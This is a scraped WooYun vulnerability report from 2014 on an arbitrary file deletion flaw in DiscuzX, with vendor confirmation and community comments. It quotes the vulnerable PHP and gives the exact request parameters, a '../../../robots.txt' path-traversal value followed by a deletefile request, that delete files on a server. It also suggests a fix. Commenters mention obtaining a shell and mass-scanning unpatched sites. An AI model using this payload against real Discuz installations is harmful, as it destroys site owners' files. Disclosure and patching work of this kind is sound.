{"id": 1338, "wybug_id": "wooyun-2014-065513", "wybug_title": "DiscuzX 任意文件操作漏洞", "wybug_corp": "Discuz!", "wybug_author": "Map", "wybug_date": "2014-06-19 19:10", "wybug_open_date": "2014-09-17 19:12", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向公众公开  简要描述： DiscuzX 任意文件操作漏洞 详细说明：  漏洞实际上是任意文件删除，但是由于删除的函数容易被定位，所以不方便写在简要描述或标题内。昨天下载DiscuzX 3.2的代码，在source/include/spacecp/spacecp_profile.php 中找到以下代码：\nif($_GET['deletefile'] && is_array($_GET['deletefile'])) {\tforeach($_GET['deletefile'] as $key => $value) {\t\tif(isset($_G['cache']['profilesetting'][$key])) {\t\t\techo (getglobal('setting/attachdir').'./profile/'.$space[$key]);\t\t\t@unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);\t\t\t@unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]);\t\t\t$verifyarr[$key] = $setarr[$key] = '';\t\t}\t}}\n往上跟发现$_GET['deletefile']没有任何处理，$space[$key]来自\n$space = getuserbyuid($_G['uid']);space_merge($space, 'field_home');space_merge($space, 'profile');\n所以我们需要在$space变量中找到一个存在需要被删除的文件的位置，我用的字段是birthprovince\n我们第一次在birthprovince里加上我们要删除的文件然后保存资料，下次我们提交$_GET['deletefile'][birthprovince]，那么$space[birthprovince]指向的文件就会被删除。\n也就是说，我们提交birthprovince为../../../robots.txt保存完之后，数据库里的$space['birthprovice']会成为../../../robots.txt，当我们提交$_GET['deletefile'][birthprovince]的时候，会去删除$space['birthprovice']指向的文件。操作步骤：那么登陆后提交：birthprovince=../../../robots.txt&profilesubmit=1&formhash=85cf7ef0注意，85cf7ef0是你的formhash。http://localhost/dx/home.php?mod=spacecp&ac=profile&op=base提示保存成功这个时候你的birthprovince就是../../../robots.txt，产生的$space['birthprovince']就是../../../robots.txt了。接下来我们来进行参数的操作，提交：birthprovince=../../../robots.txt&profilesubmit=1&formhash=85cf7ef0到http://localhost/study/dx/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaaOK，文件就被顺利删除了。   漏洞证明：  如上面所述。   修复方案：  检查下deletefile指向的key是不是自定义字段里允许FILES的字段。   版权声明：转载请注明来源 Map@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-20 10:24 厂商回复： 感谢您提供的信息。我们尽快给于修正。很神器的进攻思路。不过这也说明在程序的逻辑上，代码确实不够严谨。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-19 19:16 |    \t\tYouYaX(乌云厂商)\t\t \n  神奇神奇    \n     2014-06-19 19:16 |    \t\t筱阳 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:4        | 俺是小彩笔。)\t\t \n  坐等  神奇的路人甲    \n     2014-06-19 19:21 |    \t\tmu0u \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 先做人，后做事。)\t\t \n  神奇的路人甲     \n     2014-06-19 19:49 |    \t\t李白 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:29        )\t\t \n  雷劈吗？    \n     2014-06-19 20:16 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  那不是可以拿shell？    \n     2014-06-19 20:16 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  火前留名呢，这是要发呀    \n     2014-06-19 20:55 |    \t\t神奇的路人甲 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:16        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  神奇的路人甲    \n     2014-06-19 21:45 |    \t\t逗b炮 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:1        | muyou)\t\t \n  坐等忽略！    \n     2014-06-20 10:14 |    \t\t沙加 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 专注漏洞三十年)\t\t \n  貌似恨屌的樣子    \n     2014-06-20 10:25 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  默默mark    \n     2014-06-20 12:17 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  感谢您提供的信息。我们尽快给于修正。很神器的进攻思路。不过这也说明在程序的逻辑上，代码确实不够严谨。    \n     2014-06-23 10:33 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  感谢您提供的信息。我们尽快给于修正。很神器的进攻思路。不过这也说明在程序的逻辑上，代码确实不够严谨。    \n     2014-06-23 10:45 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  神器    \n     2014-06-26 19:41 |    \t\t猛虎 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | 分享快乐与痛苦。)\t\t \n  听起来，很好，关注    \n     2014-06-27 18:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  为什么不拿shell呢    \n     2014-07-03 16:23 |    \t\t西顾 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 保守主义，展元爱好者，啥都不会)\t\t \n   mark    \n     2014-08-20 14:43 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  多方准备啥时候发补丁，外面文件都被删完了。    \n     2014-09-17 19:54 |    \t\tSuner \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:2        | 洞次打次)\t\t \n  神奇的进攻思路    \n     2014-09-18 08:40 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  都是一些神人    \n     2014-09-18 10:09 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  默默mark，脑洞大开的进攻思路    \n     2014-10-08 15:05 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Hmily 可能因为删文件不废电    \n     2014-11-24 16:09 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  貌似一直没发补丁？    \n     2014-11-24 16:15 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  @D＆G 偷偷发了，官方没法公告，只在原来的版本上修改文件，外面基本全部没有修复，搞个exp一扫一片一片的。    \n     2014-11-24 16:49 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @Hmily 我在http://www.discuz.net/thread-3457145-1-1.html  这里下载的X3.1 完整版是存在漏洞的。然后下了最新的0630补丁看了下，也没看到有修复spacecp_profile.php这个文件。   是在完整包上直接改文件了么?    \n     2014-11-24 16:53 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  @D＆G 3.1早不管了，N多0day都没修复，只有3.2这里的 http://download.comsenz.com/DiscuzX/3.2/ 修了。    \n     2014-11-24 16:56 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @Hmily 恩，谢了。3.1已经不管了啊。。。。这可怎么过。    \n     2014-11-24 19:54 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  @D＆G 你是要自己修？自己diff下就知道怎么修了啊。    \n     2014-11-25 08:34 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @Hmily 恩。自己修，按照3.2的方法修的。感觉discuz有点坑。    \n     2014-11-26 23:19 |    \t\t我还爱 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 虚心学习)\t\t \n  @D＆G 大牛你好，我测试的程序跟你下载的一样，但是我没有成功删掉文件，只是最后显示了success，不知道为什么，    \n     2014-11-27 08:41 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  X3.1 ?如果是没打过补丁的，应该是可以的。多输出调试一下看看吧。    \n     2015-06-07 00:11 |    \t\tlansebird \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 飞跃马尔代夫)\t\t \n  路过，学习学习前辈    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}